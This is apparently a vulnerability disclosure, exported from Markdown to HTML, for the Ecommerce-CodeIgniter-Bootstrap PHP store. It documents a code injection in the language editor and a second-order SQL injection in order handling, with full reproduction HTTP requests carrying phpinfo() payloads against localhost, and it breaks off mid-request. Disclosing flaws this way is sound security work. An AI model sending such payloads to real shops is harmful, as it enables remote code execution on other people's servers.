@@ -1,0 +1,687 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Ecommerce-CodeIgniter-Bootstrap.md</title>
+<meta http-equiv="Content-type" content="text/html;charset=UTF-8">
+
+<style>
+/* https://github.com/microsoft/vscode/blob/master/extensions/markdown-language-features/media/markdown.css */
+/*---------------------------------------------------------------------------------------------
+ *  Copyright (c) Microsoft Corporation. All rights reserved.
+ *  Licensed under the MIT License. See License.txt in the project root for license information.
+ *--------------------------------------------------------------------------------------------*/
+
+body {
+	font-family: var(--vscode-markdown-font-family, -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif);
+	font-size: var(--vscode-markdown-font-size, 14px);
+	padding: 0 26px;
+	line-height: var(--vscode-markdown-line-height, 22px);
+	word-wrap: break-word;
+}
+
+#code-csp-warning {
+	position: fixed;
+	top: 0;
+	right: 0;
+	color: white;
+	margin: 16px;
+	text-align: center;
+	font-size: 12px;
+	font-family: sans-serif;
+	background-color:#444444;
+	cursor: pointer;
+	padding: 6px;
+	box-shadow: 1px 1px 1px rgba(0,0,0,.25);
+}
+
+#code-csp-warning:hover {
+	text-decoration: none;
+	background-color:#007acc;
+	box-shadow: 2px 2px 2px rgba(0,0,0,.25);
+}
+
+body.scrollBeyondLastLine {
+	margin-bottom: calc(100vh - 22px);
+}
+
+body.showEditorSelection .code-line {
+	position: relative;
+}
+
+body.showEditorSelection .code-active-line:before,
+body.showEditorSelection .code-line:hover:before {
+	content: "";
+	display: block;
+	position: absolute;
+	top: 0;
+	left: -12px;
+	height: 100%;
+}
+
+body.showEditorSelection li.code-active-line:before,
+body.showEditorSelection li.code-line:hover:before {
+	left: -30px;
+}
+
+.vscode-light.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.15);
+}
+
+.vscode-light.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.40);
+}
+
+.vscode-light.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+.vscode-dark.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.4);
+}
+
+.vscode-dark.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.60);
+}
+
+.vscode-dark.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+.vscode-high-contrast.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 160, 0, 0.7);
+}
+
+.vscode-high-contrast.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 160, 0, 1);
+}
+
+.vscode-high-contrast.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+img {
+	max-width: 100%;
+	max-height: 100%;
+}
+
+a {
+	text-decoration: none;
+}
+
+a:hover {
+	text-decoration: underline;
+}
+
+a:focus,
+input:focus,
+select:focus,
+textarea:focus {
+	outline: 1px solid -webkit-focus-ring-color;
+	outline-offset: -1px;
+}
+
+hr {
+	border: 0;
+	height: 2px;
+	border-bottom: 2px solid;
+}
+
+h1 {
+	padding-bottom: 0.3em;
+	line-height: 1.2;
+	border-bottom-width: 1px;
+	border-bottom-style: solid;
+}
+
+h1, h2, h3 {
+	font-weight: normal;
+}
+
+table {
+	border-collapse: collapse;
+}
+
+table > thead > tr > th {
+	text-align: left;
+	border-bottom: 1px solid;
+}
+
+table > thead > tr > th,
+table > thead > tr > td,
+table > tbody > tr > th,
+table > tbody > tr > td {
+	padding: 5px 10px;
+}
+
+table > tbody > tr + tr > td {
+	border-top: 1px solid;
+}
+
+blockquote {
+	margin: 0 7px 0 5px;
+	padding: 0 16px 0 10px;
+	border-left-width: 5px;
+	border-left-style: solid;
+}
+
+code {
+	font-family: Menlo, Monaco, Consolas, "Droid Sans Mono", "Courier New", monospace, "Droid Sans Fallback";
+	font-size: 1em;
+	line-height: 1.357em;
+}
+
+body.wordWrap pre {
+	white-space: pre-wrap;
+}
+
+pre:not(.hljs),
+pre.hljs code > div {
+	padding: 16px;
+	border-radius: 3px;
+	overflow: auto;
+}
+
+pre code {
+	color: var(--vscode-editor-foreground);
+	tab-size: 4;
+}
+
+/** Theming */
+
+.vscode-light pre {
+	background-color: rgba(220, 220, 220, 0.4);
+}
+
+.vscode-dark pre {
+	background-color: rgba(10, 10, 10, 0.4);
+}
+
+.vscode-high-contrast pre {
+	background-color: rgb(0, 0, 0);
+}
+
+.vscode-high-contrast h1 {
+	border-color: rgb(0, 0, 0);
+}
+
+.vscode-light table > thead > tr > th {
+	border-color: rgba(0, 0, 0, 0.69);
+}
+
+.vscode-dark table > thead > tr > th {
+	border-color: rgba(255, 255, 255, 0.69);
+}
+
+.vscode-light h1,
+.vscode-light hr,
+.vscode-light table > tbody > tr + tr > td {
+	border-color: rgba(0, 0, 0, 0.18);
+}
+
+.vscode-dark h1,
+.vscode-dark hr,
+.vscode-dark table > tbody > tr + tr > td {
+	border-color: rgba(255, 255, 255, 0.18);
+}
+
+</style>
+
+<style>
+/* Tomorrow Theme */
+/* http://jmblog.github.com/color-themes-for-google-code-highlightjs */
+/* Original theme - https://github.com/chriskempson/tomorrow-theme */
+
+/* Tomorrow Comment */
+.hljs-comment,
+.hljs-quote {
+	color: #8e908c;
+}
+
+/* Tomorrow Red */
+.hljs-variable,
+.hljs-template-variable,
+.hljs-tag,
+.hljs-name,
+.hljs-selector-id,
+.hljs-selector-class,
+.hljs-regexp,
+.hljs-deletion {
+	color: #c82829;
+}
+
+/* Tomorrow Orange */
+.hljs-number,
+.hljs-built_in,
+.hljs-builtin-name,
+.hljs-literal,
+.hljs-type,
+.hljs-params,
+.hljs-meta,
+.hljs-link {
+	color: #f5871f;
+}
+
+/* Tomorrow Yellow */
+.hljs-attribute {
+	color: #eab700;
+}
+
+/* Tomorrow Green */
+.hljs-string,
+.hljs-symbol,
+.hljs-bullet,
+.hljs-addition {
+	color: #718c00;
+}
+
+/* Tomorrow Blue */
+.hljs-title,
+.hljs-section {
+	color: #4271ae;
+}
+
+/* Tomorrow Purple */
+.hljs-keyword,
+.hljs-selector-tag {
+	color: #8959a8;
+}
+
+.hljs {
+	display: block;
+	overflow-x: auto;
+	color: #4d4d4c;
+	padding: 0.5em;
+}
+
+.hljs-emphasis {
+	font-style: italic;
+}
+
+.hljs-strong {
+	font-weight: bold;
+}
+</style>
+
+<style>
+/*
+ * Markdown PDF CSS
+ */
+
+ body {
+	font-family: -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif, "Meiryo";
+	padding: 0 12px;
+}
+
+pre {
+	background-color: #f8f8f8;
+	border: 1px solid #cccccc;
+	border-radius: 3px;
+	overflow-x: auto;
+	white-space: pre-wrap;
+	overflow-wrap: break-word;
+}
+
+pre:not(.hljs) {
+	padding: 23px;
+	line-height: 19px;
+}
+
+blockquote {
+	background: rgba(127, 127, 127, 0.1);
+	border-color: rgba(0, 122, 204, 0.5);
+}
+
+.emoji {
+	height: 1.4em;
+}
+
+code {
+	font-size: 14px;
+	line-height: 19px;
+}
+
+/* for inline code */
+:not(pre):not(.hljs) > code {
+	color: #C9AE75; /* Change the old color so it seems less like an error */
+	font-size: inherit;
+}
+
+/* Page Break : use <div class="page"/> to insert page break
+-------------------------------------------------------- */
+.page {
+	page-break-after: always;
+}
+
+</style>
+
+<script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
+</head>
+<body>
+  <script>
+    mermaid.initialize({
+      startOnLoad: true,
+      theme: document.body.classList.contains('vscode-dark') || document.body.classList.contains('vscode-high-contrast')
+          ? 'dark'
+          : 'default'
+    });
+  </script>
+<p>vendor: <a href="https://github.com/kirilkirkov/Ecommerce-CodeIgniter-Bootstrap/tree/cfff7c1acb65e21606ef4dfb28daabf19b35a7e7">kirilkirkov/Ecommerce-CodeIgniter-Bootstrap at cfff7c1acb65e21606ef4dfb28daabf19b35a7e7 (github.com)</a></p>
+<p>version: before <a href="https://github.com/kirilkirkov/Ecommerce-CodeIgniter-Bootstrap/commit/d22b54e8915f167a135046ceb857caaf8479c4da">Vulnerability fixes from Lion Tree · kirilkirkov/Ecommerce-CodeIgniter-Bootstrap@d22b54e (github.com)</a></p>
+<h1 id="code-injection">Code Injection</h1>
+<p>A code injection(CWE-94) vulnerability is in <code>application/modules/admin/controllers/advanced_settings/Languages.php</code>. In the <code>saveLanguageFiles</code> method, the element of <code>$_POST['php_keys']</code> is escaped by <code>htmlentities</code> and enclosed in two single quotes as the key of <code>$lang</code>. However, <code>htmlentities</code> doesn't escape <code>'</code> , which allows the attacker to escape from single quotes and inject malicious PHP code, leading to authenticated remote code execution.</p>
+<pre class="hljs"><code><div><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">saveLanguageFiles</span><span class="hljs-params">()</span>
+    </span>{
+        $i = <span class="hljs-number">0</span>;
+        $prevFile = <span class="hljs-string">'none'</span>;
+        $phpFileInclude = <span class="hljs-string">"&lt;?php \n"</span>;
+        <span class="hljs-keyword">foreach</span> ($_POST[<span class="hljs-string">'php_files'</span>] <span class="hljs-keyword">as</span> $phpFile) {
+            <span class="hljs-keyword">if</span> ($phpFile != $prevFile &amp;&amp; $i &gt; <span class="hljs-number">0</span>) {
+                savefile($prevFile, $phpFileInclude);
+                $phpFileInclude = <span class="hljs-string">"&lt;?php \n"</span>;
+            }
+            $php_value = str_replace(<span class="hljs-string">"'"</span>, <span class="hljs-string">'&amp;#39;'</span>, $_POST[<span class="hljs-string">'php_values'</span>][$i]);
+			$php_value = str_replace(<span class="hljs-string">'"'</span>, <span class="hljs-string">'&amp;#34;'</span>, $php_value);
+            $phpFileInclude .= <span class="hljs-string">'$lang[\''</span> . htmlentities($_POST[<span class="hljs-string">'php_keys'</span>][$i]) . <span class="hljs-string">'\'] = \''</span> . $php_value . <span class="hljs-string">'\';'</span> . <span class="hljs-string">"\n"</span>;
+            $prevFile = $phpFile;
+            $i++;
+        }
+        savefile($phpFile, $phpFileInclude);
+        ......
+</div></code></pre>
+<pre class="hljs"><code><div><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">savefile</span><span class="hljs-params">($file, $info)</span>
+</span>{
+    $file = fopen($file, <span class="hljs-string">"w"</span>);
+    fwrite($file, $info);
+    fclose($file);
+}
+</div></code></pre>
+<p>The steps to reproduce are as follows:</p>
+<pre class="hljs"><code><div><span class="hljs-keyword">POST</span> <span class="hljs-string">/Ecommerce-CodeIgniter-Bootstrap/admin/languages/?editLang=english</span> HTTP/1.1
+<span class="hljs-attribute">Host</span>: localhost
+<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate
+<span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded
+<span class="hljs-attribute">Content-Length</span>: 39539
+<span class="hljs-attribute">Origin</span>: http://localhost
+<span class="hljs-attribute">Connection</span>: close
+<span class="hljs-attribute">Referer</span>: http://localhost/Ecommerce-CodeIgniter-Bootstrap/admin/languages/?editLang=english
+<span class="hljs-attribute">Cookie</span>: ci_session=s42mnne1b8qtto2hfi675l8ej6a34me2
+<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1
+<span class="hljs-attribute">Sec-Fetch-Dest</span>: document
+<span class="hljs-attribute">Sec-Fetch-Mode</span>: navigate
+<span class="hljs-attribute">Sec-Fetch-Site</span>: same-origin
+<span class="hljs-attribute">Sec-Fetch-User</span>: ?1
+
+<span class="lsl">goDaddyGo=&amp;php_files%<span class="hljs-number">5</span>B%<span class="hljs-number">5</span>D=application%<span class="hljs-number">5</span>Clanguage%<span class="hljs-number">5</span>Cenglish%<span class="hljs-number">5</span>Cadmin_lang.php&amp;php_keys%<span class="hljs-number">5</span>B%<span class="hljs-number">5</span>D='.phpinfo().'&amp;php_values%<span class="hljs-number">5</span>B%<span class="hljs-number">5</span>D=Home&amp;php_files%<span class="hljs-number">5</span>B%<span class="hljs-number">5</span>D=application%<span class="hljs-number">5</span>Clanguage%<span class="hljs-number">5</span>Cenglish%<span class="hljs-number">5</span>Cadmin_lang.php&amp;php_keys%<span class="hljs-number">5</span>B%<span class="hljs-number">5</span>D=production&amp;php_values%<span class="hljs-number">5</span>B%<span class="hljs-number">5</span>D=Production&amp;php_files%<span class="hljs-number">5</span>B%<span class="hljs-number">5</span>D=application%<span class="hljs-number">5</span>Clanguage%<span class="hljs-number">5</span>Cenglish%<span class="hljs-number">5</span>Cadmin_lang.php&amp;php_keys%<span class="hljs-number">5</span>B%<span class="hljs-number">5</span>D=pass_change&amp;php_values%<span class="hljs-number">5</span>B%<span class="hljs-number">5</span>D=Pass+Change&amp;php_files%<span class="hljs-number">5</span>B%<span class="hljs-number">5</span>D=application%<span class="hljs-number">5</span>Clanguage%<span class="hljs-number">5</span>Cenglish%<span class="hljs-number">5</span>Cadmin_lang.php&amp;php_keys%<span class="hljs-number">5</span>B%<span class="hljs-number">5</span>D=security&amp;php_values%<span class="hljs-number">5</span>B%<span class="hljs-number">5</span>D=Security&amp;php_files%<span class="hljs-number">5</span>B%<span class="hljs-number">5</span>D=application%<span class="hljs-number">5</span>Clanguage%<span class="hljs-number">5</span>Cenglish%<span class="hljs-number">5</span>Cadmin_lang.php&amp;php_keys%<span class="hljs-number">5</span>B%<span class="hljs-number">5</span>D=<span class="hljs-section">changed</span>&amp;php_values%<span class="hljs-number">5</span>B%<span class="hljs-number">5</span>D=Changed&amp;php_files%<span class="hljs-number">5</span>B%<span class="hljs-number">5</span>D=application%<span class="hljs-number">5</span>Clanguage%<span class="hljs-number">5</span>Cenglish%<span class="hljs-number">5</span>Cadmin_lang.php&amp;php_keys%<span class="hljs-number">5</span>B%<span class="hljs-number">5</span>D=change_my_password
+......
+</span></div></code></pre>
+<p>The <code>application/language/english/admin_lang.php</code> will be:</p>
+<pre class="hljs"><code><div><span class="hljs-meta">&lt;?php</span> 
+$lang[<span class="hljs-string">''</span>.phpinfo().<span class="hljs-string">''</span>] = <span class="hljs-string">'Home'</span>;
+$lang[<span class="hljs-string">'production'</span>] = <span class="hljs-string">'Production'</span>;
+......
+</div></code></pre>
+<p>visit <code>http://localhost/Ecommerce-CodeIgniter-Bootstrap/index.php/admin/languages</code> again and <code>phpinfo()</code> will be executed.</p>
+<p><img src="../images/Pasted image 20240103001148.png" alt=""></p>
+<h1 id="file-inclusion--second-order-sql-injection">File Inclusion &amp;&amp; Second-Order SQL Injection</h1>
+<p>A file inclusion(CWE-98) vulnerability is in <code>application/modules/admin/controllers/advanced_settings/Languages.php</code> and a second-order SQL injection vulnerability is in <code>application/modules/admin/models/Orders_model.php</code>. The combination of these two vulnerabilities will result in authenticated remote code execution.</p>
+<h2 id="second-order-sql-injection">Second-Order SQL Injection</h2>
+<p>This vulnerability is in <code>manageQuantitiesAndProcurement</code> method of <code>application/modules/admin/models/Orders_model.php</code>. The <code>$product['product_quantity']</code> and <code>$product['product_info']['id']</code> are inserted into SQL statements without any sanitizers. These two values come from previous query result and users can control them in <code>setOrder</code> method of <code>application/models/Public_model.php</code>, which leads to a SQL injection.</p>
+<pre class="hljs"><code><div><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">manageQuantitiesAndProcurement</span><span class="hljs-params">($id, $to_status, $current)</span>
+    </span>{
+        <span class="hljs-keyword">if</span> (($to_status == <span class="hljs-number">0</span> || $to_status == <span class="hljs-number">2</span>) &amp;&amp; $current == <span class="hljs-number">1</span>) {
+            $operator = <span class="hljs-string">'+'</span>;
+            $operator_pro = <span class="hljs-string">'-'</span>;
+        }
+        <span class="hljs-keyword">if</span> ($to_status == <span class="hljs-number">1</span>) {
+            $operator = <span class="hljs-string">'-'</span>;
+            $operator_pro = <span class="hljs-string">'+'</span>;
+        }
+        <span class="hljs-keyword">$this</span>-&gt;db-&gt;select(<span class="hljs-string">'products'</span>);
+        <span class="hljs-keyword">$this</span>-&gt;db-&gt;where(<span class="hljs-string">'id'</span>, $id);
+        $result = <span class="hljs-keyword">$this</span>-&gt;db-&gt;get(<span class="hljs-string">'orders'</span>);
+        $arr = $result-&gt;row_array();
+        $products = unserialize($arr[<span class="hljs-string">'products'</span>]);
+        <span class="hljs-keyword">foreach</span> ($products <span class="hljs-keyword">as</span> $product) {
+                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($operator)) {
+                    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">$this</span>-&gt;db-&gt;query(<span class="hljs-string">'UPDATE products SET quantity=quantity'</span> . $operator . $product[<span class="hljs-string">'product_quantity'</span>] . <span class="hljs-string">' WHERE id = '</span> . $product[<span class="hljs-string">'product_info'</span>][<span class="hljs-string">'id'</span>])) {
+                        log_message(<span class="hljs-string">'error'</span>, print_r(<span class="hljs-keyword">$this</span>-&gt;db-&gt;error(), <span class="hljs-keyword">true</span>));
+                        show_error(lang(<span class="hljs-string">'database_error'</span>));
+                    }
+                }
+                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($operator_pro)) {
+                    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">$this</span>-&gt;db-&gt;query(<span class="hljs-string">'UPDATE products SET procurement=procurement'</span> . $operator_pro . $product[<span class="hljs-string">'product_quantity'</span>] . <span class="hljs-string">' WHERE id = '</span> . $product[<span class="hljs-string">'product_info'</span>][<span class="hljs-string">'id'</span>])) {
+                        log_message(<span class="hljs-string">'error'</span>, print_r(<span class="hljs-keyword">$this</span>-&gt;db-&gt;error(), <span class="hljs-keyword">true</span>));
+                        show_error(lang(<span class="hljs-string">'database_error'</span>));
+                    }
+                } 
+        }
+    }
+</div></code></pre>
+<pre class="hljs"><code><div><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setOrder</span><span class="hljs-params">($post)</span>
+    </span>{
+        $q = <span class="hljs-keyword">$this</span>-&gt;db-&gt;query(<span class="hljs-string">'SELECT MAX(order_id) as order_id FROM orders'</span>);
+        $rr = $q-&gt;row_array();
+        <span class="hljs-keyword">if</span> ($rr[<span class="hljs-string">'order_id'</span>] == <span class="hljs-number">0</span>) {
+            $rr[<span class="hljs-string">'order_id'</span>] = <span class="hljs-number">1233</span>;
+        }
+        $post[<span class="hljs-string">'order_id'</span>] = $rr[<span class="hljs-string">'order_id'</span>] + <span class="hljs-number">1</span>;
+
+        $i = <span class="hljs-number">0</span>;
+        $post[<span class="hljs-string">'products'</span>] = <span class="hljs-keyword">array</span>();
+        <span class="hljs-keyword">foreach</span> ($post[<span class="hljs-string">'id'</span>] <span class="hljs-keyword">as</span> $product) {
+            $post[<span class="hljs-string">'products'</span>][$product] = $post[<span class="hljs-string">'quantity'</span>][$i];
+            $i++;
+        }
+        <span class="hljs-keyword">unset</span>($post[<span class="hljs-string">'id'</span>], $post[<span class="hljs-string">'quantity'</span>]);
+        $post[<span class="hljs-string">'date'</span>] = time();
+        $products_to_order = [];
+        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>($post[<span class="hljs-string">'products'</span>])) {
+            <span class="hljs-keyword">foreach</span>($post[<span class="hljs-string">'products'</span>] <span class="hljs-keyword">as</span> $pr_id =&gt; $pr_qua) {
+                $products_to_order[] = [
+                    <span class="hljs-string">'product_info'</span> =&gt; <span class="hljs-keyword">$this</span>-&gt;getOneProductForSerialize($pr_id),
+                    <span class="hljs-string">'product_quantity'</span> =&gt; $pr_qua
+                    ];
+            }
+        }
+        $post[<span class="hljs-string">'products'</span>] = serialize($products_to_order);
+        <span class="hljs-keyword">$this</span>-&gt;db-&gt;trans_begin();
+        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">$this</span>-&gt;db-&gt;insert(<span class="hljs-string">'orders'</span>, <span class="hljs-keyword">array</span>(
+                    <span class="hljs-string">'order_id'</span> =&gt; $post[<span class="hljs-string">'order_id'</span>],
+                    <span class="hljs-string">'products'</span> =&gt; $post[<span class="hljs-string">'products'</span>],
+                    <span class="hljs-string">'date'</span> =&gt; $post[<span class="hljs-string">'date'</span>],
+                    <span class="hljs-string">'referrer'</span> =&gt; $post[<span class="hljs-string">'referrer'</span>],
+                    <span class="hljs-string">'clean_referrer'</span> =&gt; $post[<span class="hljs-string">'clean_referrer'</span>],
+                    <span class="hljs-string">'payment_type'</span> =&gt; $post[<span class="hljs-string">'payment_type'</span>],
+                    <span class="hljs-string">'paypal_status'</span> =&gt; @$post[<span class="hljs-string">'paypal_status'</span>],
+                    <span class="hljs-string">'discount_code'</span> =&gt; @$post[<span class="hljs-string">'discountCode'</span>],
+                    <span class="hljs-string">'user_id'</span> =&gt; $post[<span class="hljs-string">'user_id'</span>]
+                ))) {
+            log_message(<span class="hljs-string">'error'</span>, print_r(<span class="hljs-keyword">$this</span>-&gt;db-&gt;error(), <span class="hljs-keyword">true</span>));
+        }
+        $lastId = <span class="hljs-keyword">$this</span>-&gt;db-&gt;insert_id();
+        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">$this</span>-&gt;db-&gt;insert(<span class="hljs-string">'orders_clients'</span>, <span class="hljs-keyword">array</span>(
+                    <span class="hljs-string">'for_id'</span> =&gt; $lastId,
+                    <span class="hljs-string">'first_name'</span> =&gt; <span class="hljs-keyword">$this</span>-&gt;encryption-&gt;encrypt($post[<span class="hljs-string">'first_name'</span>]),
+                    <span class="hljs-string">'last_name'</span> =&gt; <span class="hljs-keyword">$this</span>-&gt;encryption-&gt;encrypt($post[<span class="hljs-string">'last_name'</span>]),
+                    <span class="hljs-string">'email'</span> =&gt; <span class="hljs-keyword">$this</span>-&gt;encryption-&gt;encrypt($post[<span class="hljs-string">'email'</span>]),
+                    <span class="hljs-string">'phone'</span> =&gt; <span class="hljs-keyword">$this</span>-&gt;encryption-&gt;encrypt($post[<span class="hljs-string">'phone'</span>]),
+                    <span class="hljs-string">'address'</span> =&gt; <span class="hljs-keyword">$this</span>-&gt;encryption-&gt;encrypt($post[<span class="hljs-string">'address'</span>]),
+                    <span class="hljs-string">'city'</span> =&gt; <span class="hljs-keyword">$this</span>-&gt;encryption-&gt;encrypt($post[<span class="hljs-string">'city'</span>]),
+                    <span class="hljs-string">'post_code'</span> =&gt; <span class="hljs-keyword">$this</span>-&gt;encryption-&gt;encrypt($post[<span class="hljs-string">'post_code'</span>]),
+                    <span class="hljs-string">'notes'</span> =&gt; <span class="hljs-keyword">$this</span>-&gt;encryption-&gt;encrypt($post[<span class="hljs-string">'notes'</span>])
+                ))) {
+            log_message(<span class="hljs-string">'error'</span>, print_r(<span class="hljs-keyword">$this</span>-&gt;db-&gt;error(), <span class="hljs-keyword">true</span>));
+        }
+        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;db-&gt;trans_status() === <span class="hljs-keyword">FALSE</span>) {
+            <span class="hljs-keyword">$this</span>-&gt;db-&gt;trans_rollback();
+            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
+        } <span class="hljs-keyword">else</span> {
+            <span class="hljs-keyword">$this</span>-&gt;db-&gt;trans_commit();
+            <span class="hljs-keyword">return</span> $post[<span class="hljs-string">'order_id'</span>];
+        }
+    }
+</div></code></pre>
+<p>The steps to reproduce are as follows(Assuming there exists a product):</p>
+<ul>
+<li>Inject malicious SQL statement into <code>orders</code> table (Here I inject <code>&lt;?php phpinfo();?&gt;</code> to cause an error in SQL query, which will be used in next vulnerability).</li>
+</ul>
+<pre class="hljs"><code><div><span class="hljs-keyword">POST</span> <span class="hljs-string">/Ecommerce-CodeIgniter-Bootstrap/checkout</span> HTTP/1.1
+<span class="hljs-attribute">Host</span>: localhost
+<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate
+<span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded
+<span class="hljs-attribute">Content-Length</span>: 257
+<span class="hljs-attribute">Origin</span>: http://localhost
+<span class="hljs-attribute">Connection</span>: close
+<span class="hljs-attribute">Referer</span>: http://localhost/Ecommerce-CodeIgniter-Bootstrap/checkout
+<span class="hljs-attribute">Cookie</span>: ci_session=pdjd6p7466aoamfqj94n5dlemovk8d52; shopping_cart=a%3A1%3A%7Bi%3A0%3Bi%3A2%3B%7D
+<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1
+<span class="hljs-attribute">Sec-Fetch-Dest</span>: document
+<span class="hljs-attribute">Sec-Fetch-Mode</span>: navigate
+<span class="hljs-attribute">Sec-Fetch-Site</span>: same-origin
+<span class="hljs-attribute">Sec-Fetch-User</span>: ?1
+
+<span class="sas">payment_type=cashOnDelivery<span class="hljs-variable">&amp;first_name</span>=test<span class="hljs-variable">&amp;last_name</span>=test<span class="hljs-variable">&amp;email</span>=test%40test.com<span class="hljs-variable">&amp;phone</span>=123456<span class="hljs-variable">&amp;address</span>=test<span class="hljs-variable">&amp;city</span>=test<span class="hljs-variable">&amp;post_code</span>=<span class="hljs-variable">&amp;notes</span>=<span class="hljs-variable">&amp;discountCode</span>=<span class="hljs-variable">&amp;id</span>%5B%5D=2<span class="hljs-variable">&amp;quantity</span>%5B%5D=&lt;?php%20phpinfo();?&gt;<span class="hljs-variable">&amp;final_amount</span>=100.00<span class="hljs-variable">&amp;amount_currency</span>=<span class="hljs-name">%E2</span>%82<span class="hljs-name">%AC</span><span class="hljs-variable">&amp;discountAmount</span>=
+</span></div></code></pre>
+<ul>
+<li>When the adminstrator processes this order, malicious SQL statement will be executed.</li>
+</ul>
+<p><img src="../images/Pasted image 20240103001200.png" alt=""></p>
+<pre class="hljs"><code><div><span class="hljs-keyword">POST</span> <span class="hljs-string">/Ecommerce-CodeIgniter-Bootstrap/admin/changeOrdersOrderStatus</span> HTTP/1.1
+<span class="hljs-attribute">Host</span>: localhost
+<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+<span class="hljs-attribute">Accept</span>: */*
+<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate
+<span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded; charset=UTF-8
+<span class="hljs-attribute">X-Requested-With</span>: XMLHttpRequest
+<span class="hljs-attribute">Content-Length</span>: 948
+<span class="hljs-attribute">Origin</span>: http://localhost
+<span class="hljs-attribute">Connection</span>: close
+<span class="hljs-attribute">Referer</span>: http://localhost/Ecommerce-CodeIgniter-Bootstrap/admin/orders
+<span class="hljs-attribute">Cookie</span>: ci_session=uorgo8vkqc9u130ejr3bueljd3kaai3v; shopping_cart=a%3A1%3A%7Bi%3A0%3Bi%3A2%3B%7D
+<span class="hljs-attribute">Sec-Fetch-Dest</span>: empty
+<span class="hljs-attribute">Sec-Fetch-Mode</span>: cors
+<span class="hljs-attribute">Sec-Fetch-Site</span>: same-origin
+
+<span class="angelscript">the_id=<span class="hljs-number">8</span>&amp;to_status=<span class="hljs-number">1</span>&amp;products=a%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bi%<span class="hljs-number">3</span>A0%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A12%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>product_info%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A17%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A11%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>vendor_name%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BN%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A9%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>vendor_id%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">220</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>id%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">222</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A6%<span class="hljs-number">3</span>A%<span class="hljs-number">22f</span>older%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A10%<span class="hljs-number">3</span>A%<span class="hljs-number">221704214075</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A5%<span class="hljs-number">3</span>A%<span 